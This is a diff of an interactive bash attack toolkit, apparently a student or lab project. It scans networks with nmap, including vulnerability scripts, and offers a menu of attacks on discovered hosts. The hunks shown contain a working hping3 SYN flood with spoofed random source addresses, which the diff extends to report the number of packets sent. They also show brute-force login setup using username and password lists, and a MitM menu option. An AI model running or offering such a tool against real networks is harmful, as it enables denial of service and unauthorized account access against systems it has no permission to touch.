@@ -1,7 +1,5 @@
 #!/bin/bash
 
-# Remember to change shebang when running the script to #! /bin/sh (VIM color corruption)
-# # Remember to change shebang when editing the script to #! /bin/bash (VIM color corruption)
 
 
 # //////
@@ -158,10 +156,8 @@ Calc_range() {
 	#echo -e "[*] calc_range activated with values $1 and $2"
 	first="$(echo -e "$1" | sed 's/[^.]*$/0/')"
 	last="$(echo -e "$2" | sed 's/[^.]*$/255/')"
-	#echo -e "[*] $first || $last"
 	first_sep="$(echo ${first//./ })"
 	last_sep="$(echo ${last//./ })"
-	#echo -e "[*] ${first_sep[1]}.${first_sep[0]}.${last_sep[3]}.${last_sep[1]}" # not indexed, just strs
 	first_hex="$(printf '%02X' $first_sep)"
 	last_hex="$(printf '%02X' $last_sep)"
 	first_des=$((16#$first_hex))
@@ -223,7 +219,11 @@ Exec_SYN_Flood() {
 	duration="$3"
 	echo -e "[*] Initiating SYN flood DoS attack on target for $duration seconds!"
 	Log_entries "SYN-Flood" "Started" "$target:$port"
-	timeout $duration hping3 -S -p $port $target --flood --rand-source # With spoofing source addr
+	# Answer to my question : https://unix.stackexchange.com/a/3657
+	# Another answer to my question : https://stackoverflow.com/q/962255
+	timeout $duration hping3 -S -p $port $target --flood --rand-source 1> /dev/null 2> /tmp/Error
+	pkt="$(cat /tmp/Error | awk '$2=="packets" {print $1}')"
+	echo -e "[!] SYN-Flood attack completed with $pkt packets sent!"
 	Log_entries "SYN-Flood" "Ended" "$target:$port"
 	echo -e "[*] Finished SYN flood DoS attack"
 }
@@ -252,13 +252,11 @@ Exec_BruteForce() {
 
 	# Create lines for the command to fit if the user chose a username/password, or files.
 	if [ -f "$uname" ]; then
-		#echo -e "[*] File detected!" #Debugging
 		uline="-L $uname"
 	else
 		uline="-l $uname"
 	fi
 	if [ -f "$pword" ]; then
-		#echo -e "[*] File detected!"#Debugging
 		pline="-P $pword"
 	else
 		pword="-p $pword"
@@ -346,6 +344,7 @@ Check_dependencies() {
 	done
 	str=${str%\\|}
 	res="$(dpkg -l | awk '{print $2}' | grep -w "$str")"
+	tput sc
 	echo -e "[*] Checking required packages..."
 	for tool in "${tools[@]}"; do
 		if $(echo -e "$res" | grep -wq "$tool"); then
@@ -375,7 +374,8 @@ Check_dependencies() {
 			fi
 		done
 	else
-		printf "\e[9A$(tput ed)"
+		#printf "\e[9A$(tput ed)"
+		clr
 		echo -e "[*] All required packages are already installed!"
 	fi
 }
@@ -412,16 +412,11 @@ Advanced_Scan() {
 	# I think I can get rid of the $scan_type variable, since both "Nuke" and "Host" interact exactily the same way with the Test_nmap_range_input func.
 	if [[ "$scan_type" == "Nuke" ]]; then
 		scan_ranges="$(Test_nmap_range_input "$net_start" "$net_end")"
-		#echo -e "$scan_ranges"
-		#Nuke_scan
-		#nmap -PP -PE -PM -n -sn
 	elif [[ "$scan_type" == "Host" ]]; then
-		#Host_scan "$net_start" "$net_end"
 		scan_ranges="$(Test_nmap_range_input "$net_start" "$net_end")"
 	elif [[ "$scan_type" == "Network" ]]; then
 		echo -e "PROTOTYPE PLACEHOLDER!"
 	fi
-	#nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 | awk --posix '$NF ~ /^172\.16\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})/ {print $NF}' >> tmp_Hosts_IP.txt
 	if [[ "$range_type" == 1 ]]; then
 		awk_regex="$(echo -e "$range10" | sed 's/\\/\\\\/g' | sed 's/\$//')"
 		#awk_regex=$range10
@@ -429,18 +424,12 @@ Advanced_Scan() {
 		awk_regex="$(echo -e "$range192" | sed 's/\\/\\\\/g' | sed 's/\$//')"
 	elif [[ "$range_type" == 3 ]]; then
 		awk_regex="$(echo -e "$range172" | sed 's/\\/\\\\/g' | sed 's/\$//')"
-		#awk_regex='^172\\.16\\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})\\.(25[0-5]|2[0-4][0-9]|1[0-9]{1,2}|[0-9]{1,2})'
 	fi
-	# TESTING: added "--exclude $host_ip" to nmap command to see how it interacts with the script as a whole!
-	#nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 | awk -v regi="$awk_regex" --posix '$NF ~ regi {print $NF}' >> ${fold}/${date_str}/IPs.txt
-	#echo -e "$scan_ranges" # DEBUGGING
 	echo -e "[*] Started host scan. This might take a while..."
 	Log_entries "host" "Started" "$scan_ranges"
 	nmap -PP -PE -PM -n -sn $scan_ranges --min-rate=20000 --exclude $host_ip | awk -v regi="$awk_regex" --posix '$NF ~ regi {print $NF}' >> ${fold}/${date_str}/IPs.txt
 	Log_entries "host" "Ended" "$scan_ranges"
 	printf "\e[1A$(tput ed)" # Remove the "This might take a while" message after scan completion.
-	#echo -e "[*] Scan completed! discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts! (including this host)"
-	#echo -e "[*] Scan completed! discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts!"
 
 }
 
@@ -464,8 +453,6 @@ Info_Gathering() {
 	ports_2_scan="$1"
 	echo -e "[*] Starting port and services scans on the discovered active hosts. This might take a while..."
 	# Start scanning the discovered IPs for ports and services
-	#nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt --script=auth,vuln,version -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt --exclude $host_ip &> /dev/null
-	#nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt --script=auth,vuln,version -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt &> /dev/null
 	Log_entries "port" "Started" "$(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts"
 	nmap -sS -sV -Pn -n $ports_2_scan -iL ${fold}/${date_str}/IPs.txt $NSE_scripts -oX ${fold}/${date_str}/scripts.xml -oG ${fold}/${date_str}/grepable.txt &> /dev/null
 	Log_entries "port" "Ended" "$(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts"
@@ -510,7 +497,6 @@ Basic_menu2_2() {
 		echo -e "Please select where to scan for possible hosts:\n	1. Set scan range manually\n	2. Scan in subnet (Arp-scan)\n	3. Scan entire network\n\n$ERR_MSG\n"
 		read -p "Input> " option
 		if [[ "$option" -eq 1 ]]; then
-		#	printf "\e[8A$(tput ed)"
 			clr
 			if Basic_menu3_2; then
 				break
@@ -520,17 +506,14 @@ Basic_menu2_2() {
 			fi
 		elif [[ "$option" -eq 2 ]]; then
 			clr
-		#	printf "\e[8A$(tput ed)"
 			Subnet_Scan
 			break
 		elif [[ "$option" -eq 3 ]]; then
 			clr
-		#	printf "\e[8A$(tput ed)"
 			Advanced_Scan "Nuke" "0.0.0.0" "0.0.0.0"
 			break
 		else
 			ERR_MSG="Bad input!"
-		#	printf "\e[8A$(tput ed)"
 			clr
 			continue
 		fi
@@ -540,9 +523,7 @@ Basic_menu2_2() {
 	echo -e "[*] Scan completed! Discovered $(cat ${fold}/${date_str}/IPs.txt | wc -l) hosts!"
 }
 
-# Make sure the 4th octat will be * in the default options and after the user sets an option.
 Basic_menu3_2() {
-	#sleep 5 # Debugging
 	ERR_MSG=""
 	ex_status=""
 	Network_scan_start=""
@@ -565,9 +546,7 @@ Basic_menu3_2() {
 		for opt in $(echo -e "$option"); do
 			options+=("$opt")
 		done
-		#printf "\e[7A$(tput ed)"
 		clr
-		#echo -e "${options[0]} | ${options[1]}" # DEBUGGING
 		if [[ "${options[0]}" == 1 ]]; then
 			if [[ -z "${options[1]}" ]]; then
 				ERR_MSG="ERROR : Bad usage. No IP address was given (ex: 1 <IP_ADDR>)."
@@ -592,7 +571,6 @@ Basic_menu3_2() {
 			break
 		elif [[ "${options[0]}" == 4 ]]; then
 			ERR_MSG=""
-			# I can make Basic_menu2_2 work as a while-loop, and have this option return an irregual exit status to cause stop this func and return to the previous menu...
 			ex_status=1
 			break
 		else
@@ -604,7 +582,6 @@ Basic_menu3_2() {
 
 Basic_menu_port_scan() {
 	target_ip_cnt="$(cat ./${fold}/${date_str}/IPs.txt | wc -l)"
-	#target_ip_cnt="3" # DEBUGGING
 	ERR_MSG=""
 	NSE_status=(0 1 0) # auth,vuln.version; 0=OFF 1=ON
 	tput sc
@@ -632,12 +609,11 @@ Basic_menu_port_scan() {
 			ports_2_scan=""
 			break
 		elif [ "${options[0]}" == 3 ]; then
-			#ports_2_scan="poor soul"
 			ports_2_scan="-p-"
 			break
 		elif [ "${options[0]}" == 4 ]; then # Remove or fix - causes issues with simp.txt (see 03012024_0816)
 			if [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
-				ports_2_scan="--top-ports ${options[1]} --open" # Tecnically solves 03012024_0816 (?)
+				ports_2_scan="--top-ports ${options[1]} --open"
 				break
 			else
 				ERR_MSG="ERROR : Option only accepts numbers as values (ex: 4 69, 4 420, etc)"
@@ -658,8 +634,6 @@ Basic_menu_port_scan() {
 			continue
 		fi
 	done
-	# Add line to run Info_Gathering with arg of ports to scan
-	# Add a variable to transfer the NSEs + add to Info_Gathering a way of using the new var to change "--scripts" in nmap command. 
 	Info_Gathering "$ports_2_scan" ${NSE_status[0]} ${NSE_status[1]} ${NSE_status[2]}
 
 }
@@ -678,7 +652,6 @@ Basic_menu4() {
 		for opt in $(echo -e "$option"); do
 			options+=("$opt")
 		done
-		#printf "\e[8A$(tput ed)"
 		clr
 		if [[ "${options[0]}" == 1 ]]; then
 			if [[ -z "${options[1]}" ]]; then
@@ -686,8 +659,6 @@ Basic_menu4() {
 			elif ! [[ "${options[1]}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
 				err_msg="ERROR : given input does not match IP template!"
 			elif $(cat ${fold}/${date_str}/simp.txt | awk '{print $1}' | grep -qw "${options[1]}"); then # If the given input is a target address that exists in simp.txt:
-			#elif $(cat $tmp_file_path | awk '{print $1}' | grep -q "${options[1]}"); then # DEBUGGING
-				#echo -e "PLACEHOLDER - MOVE TO THE NEXT MENU"
 				selected_target="${options[1]}"
 				break
 			else
@@ -714,18 +685,15 @@ Basic_menu4() {
 Basic_menu5() {
 	ex_status=""
 	target_ip="$1"
-	#target_ip="1.1.1.1" # DEBUGGING
 	ERR_MSG=""
 	echo -e "[!] Selected target IP : $target_ip"
 	tput sc
 	while true; do
-		#echo -e "[!] Selected target IP : $target_ip\n[*] Please select an attack:\n	1. SYN-Flood\n	2. Bruteforce\n	3. MitM\n	0. Go back to previous menu\n\n$ERR_MSG\n"
 		echo -e "[*] Please select an attack:\n	1. SYN-Flood\n	2. Bruteforce\n	3. MitM\n	0. Go back to previous menu\n\n$ERR_MSG\n"
 		read -p "Input> " option
 
 		case $option in
 			"1" | "2" | "3")
-				#printf "\e[9A$(tput ed)"
 				printf "\e[1A$(tput ed)" # Removes the input field.
 				ERR_MSG=""
 				attack_name=""
@@ -740,11 +708,9 @@ Basic_menu5() {
 			"0")
 				ex_status=1
 				clr
-				#printf "\e[10A$(tput ed)"
 				printf "\e[1A$(tput ed)" # Also delete the IP addr
 				;;
 			*)
-				#printf "\e[9A$(tput ed)"
 				clr
 				ERR_MSG="[!] Invalid input!"
 				continue
@@ -783,7 +749,6 @@ Display_Desc() {
 	while true; do
 		echo -e "[?] Are you sure you want to use this attack? [y/N]"
 		read -p "Input> " bullyann
-		#printf "\e[${lines}A$(tput ed)"
 
 		case $bullyann in
 			"y" | "Y")
@@ -857,7 +822,6 @@ Basic_menu_SYN_Flood() {
 				;;
 		esac
 	done
-	#echo -e "$target_ip $target_port" #DEBUGGING
 	Exec_SYN_Flood "$target_ip" "$target_port" "$duration"
 
 }
@@ -890,7 +854,6 @@ Basic_menu_Bruteforce() {
 				elif [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
 					if cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -F '/' '{print $1}' | grep -qw "${options[1]}"; then
 						read -r port service <<< $(cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -v kek="${options[1]}" -F '/' '$1==kek {if ($5=="") {print $1" N/A"} else {print $1" "$5}}')
-						#echo -e "DEBUGGING:\nport==$port\nservice==$service\n"
 						# IMPORTANT : ADD SUPPORTED SERVICE CHECK!
 						validity="$(echo -e "$validity" | sed 's/./1/1')"
 						if [[ ${allowed_services[@]} =~ $service ]]; then
@@ -944,14 +907,12 @@ Basic_menu_Bruteforce() {
 
 # Display the discovered targets
 Basic_menu_tar() {
-	#for IP in $(cat ${fold}/${date_str}/simp.txt | sort | uniq -c)
 	echo -e "[*] Discovered targets:"
 	while read line; do
 		IP="$(echo -e "$line" | awk '{print $2}')"
 		port_count="$(echo -e "$line" | awk '{print $1}')"
 		echo -e "$IP ($port_count ports)" # I can probably make a better with printf, but this iss not a stylized demo of the script; do it later when implementing the GUI version.
 	done <<<$(cat ${fold}/${date_str}/simp.txt | awk '{print $1}' | sort | uniq -c)
-	#done <<<$(cat $tmp_file_path | awk '{print $1}' | sort | uniq -c) # DEBUGGING
 	echo -e "----[End of List]----\n"
 }
 
@@ -961,7 +922,6 @@ Basic_menu_tar() {
 Basic_menu_l8r_1() {
 	echo -e "[*] Would you like to schedule this attack for later? [y/N]\n"
 	read -p "Input> " option
-	# str.lower() & str.upper() in bash : https://stackoverflow.com/a/19411918
 	if [ "${option,,}" == "y" ]; then
 		Basic_menu_l8r_2
 	elif [ "${option,,}" == "n" ] || [ -z "$option" ]; then
@@ -982,8 +942,8 @@ Basic_menu_l8r_2() {
 # ////
 
 main() {
-	clear # DEBUG (?)
 	Root_Check
+	clear -x # Start the script at the top of the terminal screen.
 	Check_dependencies
 	Initial_setup
 	Basic_menu2_2
@@ -997,37 +957,3 @@ main
 # CONTROLLED TEST ENV
 #
 
-#Basic_menu5
-#Basic_menu_SYN_Flood
-#Basic_menu_Bruteforce
-#echo -e "TEST\nauth:\033[30;42mON${NEU}\nvuln:\033[30;41mOFF${NEU}"
-#Basic_menu_port_scan
-#Basic_menu4
-
-testing_Log_entries() {
-	test_action=("host" "port" "ARP" "SYN-Flood" "BruteForce" "MitM")
-	test_state=("Started" "Ended")
-	test_data=""
-
-	for i in "${test_action[@]}"; do
-		if [[ "$i" == "host" ]]; then
-			test_data="172.16-31.0-255.0-255"
-		elif [[ "$i" == "port" ]]; then
-			test_data="3 hosts"
-		elif [[ "$i" == "ARP" ]]; then
-			test_data="172.16.0.0/16 network"
-		elif [[ "$i" == "SYN-Flood" ]] || [[ "$i" == "BruteForce" ]]; then
-			test_data="172.16.50.1:80"
-		elif [[ "$i" == "MitM" ]]; then
-			test_data="172.16.50.1"
-		fi
-		for x in "${test_state[@]}"; do
-			Log_entries "$i" "$x" "$test_data"
-			sleep 3
-		done
-	done
-	echo -e "\nEND OF TEST"
-}
-
-#testing
-#iog_entries
